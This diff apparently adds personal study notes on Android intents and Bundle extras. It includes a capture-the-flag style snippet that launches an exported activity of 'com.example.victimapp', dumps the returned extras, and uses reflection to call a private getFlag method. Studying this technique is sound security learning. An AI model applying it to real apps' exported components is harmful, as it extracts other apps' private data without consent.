@@ -1,0 +1,74 @@
+Bundle bundle = data.getExtras(); //  Android Bundle is used to pass data between activities. The values that are to be passed are mapped to String keys which are later used in the next activity to retrieve the values.
+
+
+// (IMPLICIT INTENT)This is how Intent.resolveActivity(PackageManager) finds an activity if a class has not been explicitly specified (IMPLICIT INTENT):
+                                                                            // resolveActivity() returns the "best" Activity that can handle the Intent
+                                                                            // queryIntentActivities() Retrieve all activities that can be performed for the given intent
+                                                                        // EXPLICIT INTENT:
+                                                                            // Context.startActivity(Intent) and
+                                                                            // Intent.resolveActivity(PackageManager)
+
+                                                                        // Note: if using an implicit Intent (without an explicit ComponentName specified), be sure to consider whether to set the MATCH_DEFAULT_ONLY only flag.
+              
+
+
+startActivity()
+	Start an activity, like you would start an application: for instance: you have an app with a home-screen and a user-info screen: if you press the user-info button, you start the user-info activity with this.
+
+startActivityForResult()
+	Start an activity and expect something in return. For instance, on your user-info screen, you can upload a profile picture. You start the gallery-activity with the explicit goal to get a URI back with the preferred picture. You start this activity literaly to obtain a result (the picture. There are some techinical ways to make sure you actually get the result, but they are quite clear in the manual.
+	
+	
+	
+///////////////// EXAMPLE: ///////////////////////////////////
+
+        try {
+            Intent intent = new Intent();
+            intent.setComponent(new ComponentName("com.example.victimapp", "com.example.victimapp.SerialActivity"));
+            if ( intent.resolveActivity(getPackageManager()) != null) {
+                this.startActivityForResult(intent, REQUEST_CODE1);
+            }
+        }
+        catch (Exception e) {
+            Log.e(TAG, "doIt() Error: " + e.toString());
+        }
+        
+        
+         @Override
+    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+
+        if(requestCode == REQUEST_CODE1 && resultCode == RESULT_OK){ //check that ActivityCode is ok
+            try {
+                Log.i(TAG, data.toString());//data is an intent
+
+                Bundle bundle = data.getExtras(); //  Android Bundle is used to pass data between activities. The values that are to be passed are mapped to String keys which are later used in the next activity to retrieve the values.
+                for (String p : bundle.keySet()) {
+                    Log.i(TAG, "key: " + p + " value: " + bundle.get(p));
+                }
+                FlagContainer fc = (FlagContainer) bundle.get("flag"); //ottengo i dati spediti nell'intent  resultIntent.putExtra("flag", fc); dove fc e' la classe
+                Method method = fc.getClass().getDeclaredMethod("getFlag");
+                method.setAccessible(true);//With setAccessible() you change the behavior of the AccessibleObject, i.e. the Field instance, but not the actual field of the class. //A value of true indicates that the reflected object should suppress checks for Java language access control when it is used
+                Log.i(TAG, "Result: " + method.invoke(fc).toString());
+
+
+            } catch (Exception e){
+                Log.e(TAG, "onActivityResult Error: " + e.toString());
+            }
+        }
+    }
+/////////////////
+
+
+
+
+
+
+
+//////
+
+                Bundle bundle = data.getExtras(); //  Android Bundle is used to pass data between activities. The values that are to be passed are mapped to String keys which are later used in the next activity to retrieve the values.
+                
+                for (String p : bundle.keySet()) { // to list all extras (and their values) of an Intent
+                    Log.i(TAG, "key: " + p + " value: " + bundle.get(p));
+                }
